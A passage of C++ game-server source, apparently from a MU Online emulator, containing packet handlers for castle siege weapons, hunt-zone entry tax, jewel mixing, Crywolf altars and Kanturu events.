		g_CsNPC_Weapon.GetTargetPointXY(lpWeaponObj->Class, aRecv->btTargetIndex-1, pMsg.btPointX, pMsg.btPointY, TRUE);
	}

	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));

	pMsg.btResult = 2;

	for ( int n=0;n<MAX_VIEWPORT;n++)
	{
		if ( lpWeaponObj->VpPlayer2[n].type == OBJ_USER )
		{
			if ( lpWeaponObj->VpPlayer2[n].state )
			{
				if ( iIndex != lpWeaponObj->VpPlayer2[n].number )
				{
					DataSend(lpWeaponObj->VpPlayer2[n].number, (LPBYTE)&pMsg, sizeof(pMsg));
				}
			}
		}
	}

	gObjNotifyUseWeaponV1(lpOwnerObj, lpWeaponObj, pMsg.btPointX, pMsg.btPointY);
	g_CsNPC_Weapon.SetWeaponCalDamageInfo(wObjIndex, pMsg.btPointX, pMsg.btPointY, 10000);
}





void CGReqWeaponDamageValue(PMSG_REQ_WEAPON_DAMAGE_VALUE * aRecv, int iIndex)
{
	if ( !OBJMAX_RANGE(iIndex) )
		return;

	BYTE btTargetX = 0;
	BYTE btTargetY = 0;
	WORD wObjIndex = MAKE_NUMBERW(aRecv->btObjIndexH, aRecv->btObjIndexL);

	if ( g_CsNPC_Weapon.GetWeaponCalDamageInfo(wObjIndex, btTargetX, btTargetY) == TRUE )
	{
		gObjNotifyUseWeaponDamage(&gObj[wObjIndex], btTargetX, btTargetY);
	}
	else
	{
		MsgOutput(iIndex, lMsg.Get(MSGGET(6, 112)));
	}
}





struct PMSG_ANS_GUILDMARK_OF_CASTLEOWNER
{
	PBMSG_HEAD2 h;	// C1:B9:02
	BYTE GuildMarkOfCastleOwner[32];	// 4
};


void CGReqGuildMarkOfCastleOwner(PMSG_REQ_GUILDMARK_OF_CASTLEOWNER * aRecv, int iIndex)
{
	if ( !OBJMAX_RANGE(iIndex) )
		return;

	char szGuildName[MAX_GUILD_LEN+1] = {0};

	memcpy(szGuildName, g_CastleSiegeSync.GetCastleOwnerGuild(), MAX_GUILD_LEN);

	if ( szGuildName )
	{
		_GUILD_INFO_STRUCT * lpGuild = Guild.SearchGuild(szGuildName);

		if ( lpGuild != NULL )
		{
			PMSG_ANS_GUILDMARK_OF_CASTLEOWNER pMsg = {0};

			PHeadSubSetB((LPBYTE)&pMsg, 0xB9, 0x02, sizeof(pMsg));
			memcpy(pMsg.GuildMarkOfCastleOwner, lpGuild->Mark, sizeof(pMsg.GuildMarkOfCastleOwner));

			DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
}

struct PMSG_ANS_MOVE_TO_CASTLE_HUNTZONE // 0x5
{
    PBMSG_HEAD2 h; // +0x0(0x4)
    BYTE btResult; // +0x4(0x1)
};

void CGReqCastleHuntZoneEntrance(PMSG_REQ_MOVE_TO_CASTLE_HUNTZONE * aRecv, int iIndex)
{
#if (GS_CASTLE==1)
	if ( !OBJMAX_RANGE(iIndex) )
		return;

	LPOBJ lpObj = &gObj[iIndex];

	if ((lpObj->m_IfState.use == 1)&&(lpObj->m_IfState.type == 220))
	{
		lpObj->m_IfState.use = 0;
		lpObj->m_IfState.type = 0;
	} else {
		return;
	}

	PMSG_ANS_MOVE_TO_CASTLE_HUNTZONE pMsg = {0};

	pMsg.h.set((LPBYTE)&pMsg, 0xB9, 0x05, sizeof(pMsg));
	pMsg.btResult = 0;

	int iEnterTaxMoney = 0;

	iEnterTaxMoney = g_CastleSiegeSync.GetTaxHuntZone(lpObj->m_Index, TRUE);

	if( iEnterTaxMoney < 0)
	{
		iEnterTaxMoney = 0;
	}

	BOOL bPermission = FALSE;

	if( lpObj->lpGuild )
	{
		if( g_CastleSiege.CheckCastleOwnerMember(lpObj->m_Index) )
		{
			bPermission = TRUE;
		}

		if( g_CastleSiege.CheckCastleOwnerUnionMember(lpObj->m_Index) )
		{
			bPermission = TRUE;
		}
	}
	
	if( g_CastleSiege.GetHuntZoneEnter() )
	{
			bPermission = TRUE;
	}

	if( bPermission == TRUE )
	{
		if( lpObj->Money > iEnterTaxMoney )
		{
			if( lpObj->MapNumber == MAP_INDEX_CASTLESIEGE )
			{
				if( gObjMoveGate(lpObj->m_Index, 95) == TRUE )
				{
					pMsg.btResult = 1;
					int iOldMoney = lpObj->Money;

					lpObj->Money -= iEnterTaxMoney;

					g_CastleSiegeSync.AddTributeMoney(iEnterTaxMoney);
					
					if( lpObj->Money < 0)
					{
						lpObj->Money = 0;
					}
					
					GCMoneySend(lpObj->m_Index, lpObj->Money);

					LogAddTD("[Castle HuntZone] [%s][%s] - Entrance TAX : %d - %d = %d",
						lpObj->AccountID, lpObj->Name, iOldMoney, iEnterTaxMoney, lpObj->Money);
				}
			}
		}
	}

	DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);
#endif
}

void CGReqJewelMix(PMSG_REQ_JEWEL_MIX * lpMsg, int iIndex)
{
	if ( lpMsg == NULL )
		return;

	CJewelMixSystem::MixJewel(iIndex, lpMsg->btJewelType, lpMsg->btJewelMix);
}


struct PMSG_ANS_JEWEL_UNMIX
{
	PBMSG_HEAD2 h;	// C1:BC:[00:01]
	BYTE btResult;	// 4
};


void GCAnsJewelMix(int iIndex, int iResult)
{
	PMSG_ANS_JEWEL_UNMIX pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xBC, 0x00, sizeof(pMsg));
	pMsg.btResult = iResult;

	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}



void CGReqJewelUnMix(PMSG_REQ_JEWEL_UNMIX * lpMsg, int iIndex)
{
	if ( lpMsg == NULL )
		return;

	CJewelMixSystem::UnMixJewel(iIndex, lpMsg->btJewelType, lpMsg->btJewelLevel, lpMsg->btJewelPos);
}




void GCAnsJewelUnMix(int iIndex, int iResult)
{
	PMSG_ANS_JEWEL_UNMIX pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xBC, 0x01, sizeof(pMsg));
	pMsg.btResult = iResult;

	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}




void CGReqCrywolfInfo(PMSG_REQ_CRYWOLF_INFO* lpMsg, int iIndex)
{
	if ( !OBJMAX_RANGE(iIndex))
		return;

	GCAnsCrywolfInfo(iIndex, g_CrywolfSync.GetOccupationState(), g_CrywolfSync.GetCrywolfState());
}


void GCAnsCrywolfInfo(int iIndex, BYTE btOccupationState, BYTE btCrywolfState)
{
	PMSG_ANS_CRYWOLF_INFO pMsg={0};

	PHeadSubSetB((LPBYTE)&pMsg, 0xBD, 0x00, sizeof(pMsg));
	pMsg.btOccupationState = btOccupationState;
	pMsg.btCrywolfState = btCrywolfState;
	
	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}



struct PMSG_ANS_CRYWOLF_ALTAR_CONTRACT
{
	PBMSG_HEAD2 h;	// C1:BD:03
	BYTE btResult;	// 4
	BYTE btAltarState;	// 5
	BYTE btObjIndexH;	// 6
	BYTE btObjIndexL;	// 7
};


void CGReqAlatrContract(PMSG_REQ_CRYWOLF_ALTAR_CONTRACT* lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	int iAltarIndex = MAKE_NUMBERW(lpMsg->btObjIndexH, lpMsg->btObjIndexL);

	if ( !OBJMAX_RANGE(iIndex))
		return;

	if ( !OBJMAX_RANGE(iAltarIndex))
		return;

	LPOBJ lpObj = &gObj[iIndex];
	LPOBJ lpAltarObj = &gObj[iAltarIndex];

	if ( !CRYWOLF_ALTAR_CLASS_RANGE(lpAltarObj->Class))
		return;

	if ( !gObjIsConnected(lpObj))
		return;

	PMSG_ANS_CRYWOLF_ALTAR_CONTRACT pMsg={0};

	PHeadSubSetB((LPBYTE)&pMsg, 0xBD, 0x03, sizeof(pMsg));
	pMsg.btResult = 0;
	pMsg.btAltarState = g_CrywolfNPC_Altar.GetAltarState(lpAltarObj->Class);
	pMsg.btObjIndexH = lpMsg->btObjIndexH;
	pMsg.btObjIndexL = lpMsg->btObjIndexL;

	if ( pMsg.btAltarState == 0 && 
		 lpObj->Type == OBJ_USER &&
		 lpObj->Class == CLASS_ELF &&
		 lpObj->Level >= MIN_ELF_LEVEL_ALTAR )
	{
		if ( g_CrywolfNPC_Altar.SetAltarUserIndex(iAltarIndex, lpAltarObj->Class, iIndex) != FALSE )
		{
			pMsg.btResult = 1;
		}
	}
	else
	{
		MsgOutput(iIndex, lMsg.Get(MSGGET(13, 9)));	// #error It says 360 when real is 260	
	}

	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
#endif
}


struct PMSG_ANS_CRYWOLF_BENEFIT_PLUS_CHAOSRATE
{
	PBMSG_HEAD2 h;	// C1:BD:09
	BYTE btPlusChaosRate;	// 4
};



void CGReqPlusChaosRate(PMSG_REQ_CRYWOLF_BENEFIT_PLUS_CHAOSRATE* lpMsg, int iIndex)
{
	if ( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	PMSG_ANS_CRYWOLF_BENEFIT_PLUS_CHAOSRATE pMsg={0};

	PHeadSubSetB((LPBYTE)&pMsg, 0xBD, 0x09, sizeof(pMsg));
	pMsg.btPlusChaosRate = g_CrywolfSync.GetPlusChaosRate();

	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}


void CGReqKanturuStateInfo(PMSG_REQ_KANTURU_STATE_INFO* lpMsg, int iIndex)
{
	if ( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	#if (GS_CASTLE==0)
	g_KanturuEntranceNPC.NotifyEntranceInfo(iIndex);
	#endif
}

void GCReqEnterKanturuBossMap(PMSG_REQ_ENTER_KANTURU_BOSS_MAP* lpMsg, int iIndex)
{
	if ( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	#if (GS_CASTLE==0)
	g_KanturuEntranceNPC.NotifyResultEnterKanturuBossMap(iIndex);
	#endif
}


void CGAnsImperialNoItem(int iIndex)
{
	if ( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	PMSG_STATE_IMPERIALGUARDIAN pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF7, 0x06, sizeof(pMsg));
	pMsg.State = 1;
			
	DataSend(iIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}